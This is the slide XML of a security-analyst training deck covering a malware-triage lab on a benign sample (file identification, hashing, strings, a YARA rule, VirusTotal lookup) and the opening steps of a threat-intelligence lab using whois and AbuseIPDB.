              <a:t>$ apt update &amp;&amp; apt install -y binutils yara curl file</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Create a benign "suspicious" sample</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>We will not download real malware.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ mkdir -p /tmp/lab9 &amp;&amp; cd /tmp/lab9</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Identify the file type</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>file reads the magic bytes — never trust the extension.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ file sample.sh</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Hash the sample (chain-of-custody first step)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Always hash with SHA-256 for evidence; MD5/SHA-1 are still used by AV vendors but are cryptographically weak.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ md5sum sample.sh</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Extract strings</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Look for:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ strings -n 6 sample.sh | head -20</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308</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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1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9 — Hands-On Steps (cont'd)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39293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39293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05840" y="22509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2250948"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="1392936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Write a YARA rule</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>YARA rules let you sweep an estate for any file matching the IOCs you just found.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2205228"/>
            <a:ext cx="3977639" cy="5486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52360" y="2205228"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cat &gt; c2_beacon.yar &lt;&lt;'EOF'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3304032"/>
            <a:ext cx="10634472" cy="139293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304032"/>
            <a:ext cx="91440" cy="139293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005840" y="377190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3771900"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3304032"/>
            <a:ext cx="9509760" cy="1392936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Lookup the hash on VirusTotal (free web)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>In your browser open:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4824984"/>
            <a:ext cx="10634472" cy="139293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240" y="4824984"/>
            <a:ext cx="91440" cy="139293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005840" y="5292852"/>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05840" y="5292852"/>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3" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4824984"/>
            <a:ext cx="9509760" cy="1392936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 8: Decide: clean, suspicious, or malicious</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A simple triage matrix:</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309</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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9 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Identify file type with file (not extension).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Generate MD5/SHA-1/SHA-256 hashes for evidence.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Pull useful IOCs out of a binary with strings.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Write and run a YARA rule against a sample and a directory sweep.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Use VirusTotal and free sandboxes to enrich a hash.</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310</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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10 — Threat Intelligence and MITRE ATT&amp;CK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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will enrich a suspicious IP with whois, AbuseIPDB, and Shodan, then map an observed behaviour to a MITRE ATT&amp;CK technique using the free Navigator. You will also script a tiny SOAR-style automation. This covers CySA+ 1.4 (Threat actors, TTP, Collection methods, Threat-intelligence sharing, Active…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda + Web (AbuseIPDB, ATT&amp;CK Navigator)</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311</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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10 — Reference Diagram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g_7e5b2de820.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2153281" y="1783080"/>
            <a:ext cx="7882390" cy="4434840"/>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312</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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1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10 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install tools</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y whois curl jq</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: WHOIS lookup (Collection methods — Open source)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Things to look for in incident triage:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ whois 8.8.8.8 | grep -Ei 'orgname|country|netrange|cidr'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: AbuseIPDB API enrichment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>AbuseIPDB gives an abuse-confidence score 0–100 for any IP.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ read -p "AbuseIPDB API key (or press Enter to skip): " ABUSE_KEY</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
